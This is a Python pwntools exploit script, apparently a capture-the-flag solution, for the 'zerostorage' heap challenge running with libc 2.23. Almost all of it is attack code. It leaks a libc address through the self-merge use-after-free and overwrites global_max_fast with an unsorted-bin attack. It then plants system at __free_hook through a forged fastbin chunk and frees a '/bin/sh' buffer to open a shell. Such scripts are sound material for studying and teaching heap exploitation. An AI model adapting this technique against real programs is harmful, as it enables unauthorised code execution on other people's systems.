import pwn as p

target = p.process('./zerostorage')
p.gdb.attach(target)

libc = p.ELF('./libc-2.23.so')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def insert(size: int, payload: bytes):
    prints(target.recvuntil(b'Your choice: '))
    target.sendline(b'1')
    prints(target.recvuntil(b'Length of new entry:'))
    target.sendline(b(str(size)))
    prints(target.recvuntil(b'Enter your data:'))
    target.send(payload)


def update(id: int, size: int, payload: bytes):
    prints(target.recvuntil(b'Your choice: '))
    target.sendline(b'2')
    prints(target.recvuntil(b'Entry ID:'))
    target.sendline(b(str(id)))
    prints(target.recvuntil(b'Length of entry:'))
    target.sendline(b(str(size)))
    prints(target.recvuntil(b'Enter your data:'))
    target.send(payload)


def merge(id1: int, id2: int):
    prints(target.recvuntil(b'Your choice: '))
    target.sendline(b'3')
    prints(target.recvuntil(b'Merge from Entry ID:'))
    target.sendline(b(str(id1)))
    prints(target.recvuntil(b'Merge to Entry ID:'))
    target.sendline(b(str(id2)))


def delete(id: int):
    prints(target.recvuntil(b'Your choice: '))
    target.sendline(b'4')
    prints(target.recvuntil(b'Entry ID:'))
    target.sendline(b(str(id)))


def view(id: int):
    prints(target.recvuntil(b'Your choice: '))
    target.sendline(b'5')
    prints(target.recvuntil(b'Entry ID:'))
    target.sendline(b(str(id)))
    prints(target.recvuntil(b':\n'))
    line = target.recvline().strip()
    return line


insert(0x20, 0x20*b'a')  # id 0
insert(0xfc, 0xfc*b'b')  # id 1
merge(0, 0)  # id 2

line = view(2)
main_arena_leak = p.u64(line[:8])
print('main_arena:', hex(main_arena_leak))
libc_base = main_arena_leak - 0x3c4b78
print('libc_base:', hex(libc_base))
global_max_fast = main_arena_leak + 0x1c80
print('global_max_fast:', hex(global_max_fast))
system = libc_base + libc.symbols['system']
print('system:', hex(system))
free_hook = libc_base + libc.symbols['__free_hook']
print('free_hook:', hex(free_hook))

update(2, 0x10, p.p64(main_arena_leak) + p.p64(global_max_fast-0x10))

# allocating this chunk will overwrite `global_max_fast` value
insert(0x20, b'/bin/sh\x00' + b'c'*0x18)  # id 0

merge(1, 1)  # id 3

# write fake chunk at our id 3
payload = p.p64(free_hook-0x49)
payload += b'd' * (0x1f8 - len(payload))
update(3, 0x1f8, payload)

# create chunk that will create our fake chunk
insert(0x1f8, b'e'*0x1f8)  # id 1

payload2 = b'\x00'*0x39
payload2 += p.p64(system)
payload2 += b'\x00' * (0x1f8 - len(payload2))
insert(0x1f8, payload2)  # id 4

delete(0)

target.interactive()
